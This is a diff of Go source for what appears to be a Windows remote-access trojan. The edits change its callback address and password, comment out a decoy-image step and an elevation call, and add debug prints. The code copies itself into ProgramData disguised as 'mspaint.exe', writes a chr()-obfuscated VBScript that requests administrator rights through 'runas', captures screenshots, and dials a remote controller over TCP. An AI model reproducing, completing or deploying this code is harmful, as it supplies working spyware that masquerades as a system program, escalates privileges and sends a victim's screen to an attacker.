@@ -18,13 +18,14 @@ import (
     "strings"
     "syscall"
     "time"
+
     "github.com/axgle/mahonia"
     screenshot "github.com/kbinani/screenshot"
 )
 
 const (
-    IP      = "192.168.1.85:53"
-    CONNPWD = "zwa666"
+    IP      = "127.0.0.1:53"
+    CONNPWD = "18Sd9fkdkf9"
 )
 
 var (
@@ -36,6 +37,7 @@ var (
 
 func main() {
     if runtime.GOOS == "windows" {
+        fmt.Println("这是windows系统。。。")
         targetPath := os.Getenv("systemdrive") + "\\ProgramData\\"
         targetFile := targetPath + "mspaint.exe"
         os.Mkdir(targetPath, os.ModePerm)
@@ -92,14 +94,14 @@ func main() {
                 // start 启动目标程序,进程不需要等待交互
                 mCommand(targetFile, currentFileAbs)
                 // 打开图片
-                mCommand("cmd.exe", "/c", "start", "max.jpg")
-                install_start() //自七
+                //mCommand("cmd.exe", "/c", "start", "max.jpg")
+                //install_start() //自七
             } else {
                 // 如果文件已经存在，start 启动目标程序,进程不需要等待交互
                 mCommand(targetFile, currentFileAbs)
                 // 打开图片
-                mCommand("cmd.exe", "/c", "start", "max.jpg")
-                install_start() //自七
+                //mCommand("cmd.exe", "/c", "start", "max.jpg")
+                //install_start() //自七
 
             }
         }
@@ -111,7 +113,7 @@ func main() {
     }
 }
 
-func install_start() { //windows提升权限，加注册表.
+func install_start() { //windows提升权限，加注册表，
     err := ioutil.WriteFile("test.vbs", []byte("execute(chr(83)&chr(101)&chr(116)&chr(32)&chr(85)&chr(65)&chr(67)&chr(32)&chr(61)&chr(32)&chr(67)&chr(114)&chr(101)&chr(97)&chr(116)&chr(101)&chr(79)&chr(98)&chr(106)&chr(101)&chr(99)&chr(116)&chr(40)&chr(34)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(46)&chr(65)&chr(112)&chr(112)&chr(108)&chr(105)&chr(99)&chr(97)&chr(116)&chr(105)&chr(111)&chr(110)&chr(34)&chr(41)&chr(32)&chr(32)&chr(10)&chr(83)&chr(101)&chr(116)&chr(32)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(32)&chr(61)&chr(32)&chr(67)&chr(114)&chr(101)&chr(97)&chr(116)&chr(101)&chr(79)&chr(98)&chr(106)&chr(101)&chr(99)&chr(116)&chr(40)&chr(34)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(34)&chr(41)&chr(32)&chr(32)&chr(10)&chr(73)&chr(102)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(65)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(46)&chr(99)&chr(111)&chr(117)&chr(110)&chr(116)&chr(60)&chr(49)&chr(32)&chr(84)&chr(104)&chr(101)&chr(110)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(101)&chr(99)&chr(104)&chr(111)&chr(32)&chr(34)&chr(35821)&chr(27861)&chr(58)&chr(32)&chr(32)&chr(115)&chr(117)&chr(100)&chr(111)&chr(32)&chr(60)&chr(99)&chr(111)&chr(109)&chr(109)&chr(97)&chr(110)&chr(100)&chr(62)&chr(32)&chr(91)&chr(97)&chr(114)&chr(103)&chr(115)&chr(93)&chr(34)&chr(32)&chr(32)&chr(10)&chr(69)&chr(108)&chr(115)&chr(101)&chr(73)&chr(102)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(65)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(46)&chr(99)&chr(111)&chr(117)&chr(110)&chr(116)&chr(61)&chr(49)&chr(32)&chr(84)&chr(104)&chr(101)&chr(110)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(85)&chr(65)&chr(67)&chr(46)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(69)&chr(120)&chr(101)&chr(99)&chr(117)&chr(116)&chr(101)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(97)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(40)&chr(48)&chr(41)&chr(44)&chr(32)&chr(34)&chr(34)&chr(44)&chr(32)&chr(34)&chr(34)&chr(44)&chr(32)&chr(34)&chr(114)&chr(117)&chr(110)&chr(97)&chr(115)&chr(34)&chr(44)&chr(32)&chr(49)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(83)&chr(108)&chr(101)&chr(101)&chr(112)&chr(32)&chr(49)&chr(53)&chr(48)&chr(48)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(68)&chr(105)&chr(109)&chr(32)&chr(114)&chr(101)&chr(116)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(114)&chr(101)&chr(116)&chr(32)&chr(61)&chr(32)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(46)&chr(65)&chr(112)&chr(112)&chr(97)&chr(99)&chr(116)&chr(105)&chr(118)&chr(97)&chr(116)&chr(101)&chr(40)&chr(34)&chr(29992)&chr(25143)&chr(36134)&chr(25143)&chr(25511)&chr(21046)&chr(34)&chr(41)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(73)&chr(102)&chr(32)&chr(114)&chr(101)&chr(116)&chr(32)&chr(61)&chr(32)&chr(116)&chr(114)&chr(117)&chr(101)&chr(32)&chr(84)&chr(104)&chr(101)&chr(110)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(46)&chr(115)&chr(101)&chr(110)&chr(100)&chr(107)&chr(101)&chr(121)&chr(115)&chr(32)&chr(34)&chr(37)&chr(121)&chr(34)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(69)&chr(108)&chr(115)&chr(101)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(101)&chr(99)&chr(104)&chr(111)&chr(32)&chr(34)&chr(33258)&chr(21160)&chr(33719)&chr(21462)&chr(31649)&chr(29702)&chr(21592)&chr(26435)&chr(38480)&chr(22833)&chr(36133)&chr(65292)&chr(35831)&chr(25163)&chr(21160)&chr(30830)&chr(35748)&chr(12290)&chr(34)&chr(32)&chr(32)&chr(10)&chr(39)&chr(32)&chr(32)&chr(32)&chr(32)&chr(69)&chr(110)&chr(100)&chr(32)&chr(73)&chr(102)&chr(32)&chr(32)&chr(10)&chr(69)&chr(108)&chr(115)&chr(101)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(68)&chr(105)&chr(109)&chr(32)&chr(117)&chr(99)&chr(67)&chr(111)&chr(117)&chr(110)&chr(116)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(68)&chr(105)&chr(109)&chr(32)&chr(97)&chr(114)&chr(103)&chr(115)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(97)&chr(114)&chr(103)&chr(115)&chr(32)&chr(61)&chr(32)&chr(78)&chr(85)&chr(76)&chr(76)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(70)&chr(111)&chr(114)&chr(32)&chr(117)&chr(99)&chr(67)&chr(111)&chr(117)&chr(110)&chr(116)&chr(61)&chr(49)&chr(32)&chr(84)&chr(111)&chr(32)&chr(40)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(65)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(46)&chr(99)&chr(111)&chr(117)&chr(110)&chr(116)&chr(45)&chr(49)&chr(41)&chr(32)&chr(83)&chr(116)&chr(101)&chr(112)&chr(32)&chr(49)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(32)&chr(97)&chr(114)&chr(103)&chr(115)&chr(32)&chr(61)&chr(32)&chr(97)&chr(114)&chr(103)&chr(115)&chr(32)&chr(38)&chr(32)&chr(34)&chr(32)&chr(34)&chr(32)&chr(38)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(65)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(40)&chr(117)&chr(99)&chr(67)&chr(111)&chr(117)&chr(110)&chr(116)&chr(41)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(78)&chr(101)&chr(120)&chr(116)&chr(32)&chr(32)&chr(10)&chr(32)&chr(32)&chr(32)&chr(32)&chr(85)&chr(65)&chr(67)&chr(46)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108)&chr(69)&chr(120)&chr(101)&chr(99)&chr(117)&chr(116)&chr(101)&chr(32)&chr(87)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(97)&chr(114)&chr(103)&chr(117)&chr(109)&chr(101)&chr(110)&chr(116)&chr(115)&chr(40)&chr(48)&chr(41)&chr(44)&chr(32)&chr(97)&chr(114)&chr(103)&chr(115)&chr(44)&chr(32)&chr(34)&chr(34)&chr(44)&chr(32)&chr(34)&chr(114)&chr(117)&chr(110)&chr(97)&chr(115)&chr(34)&chr(44)&chr(32)&chr(53)&chr(32)&chr(32)&chr(10)&chr(69)&chr(110)&chr(100)&chr(32)&chr(73)&chr(102)&chr(32)&chr(32))"), 0666)
 
     if err != nil {
@@ -175,6 +177,7 @@ func TakeScreenShot() {
 
 // 连接远程服务器
 func connect() {
+    fmt.Println("开始连接....")
     conn, err := net.Dial("tcp", IP)
     if err != nil {
         fmt.Println("Connection...")
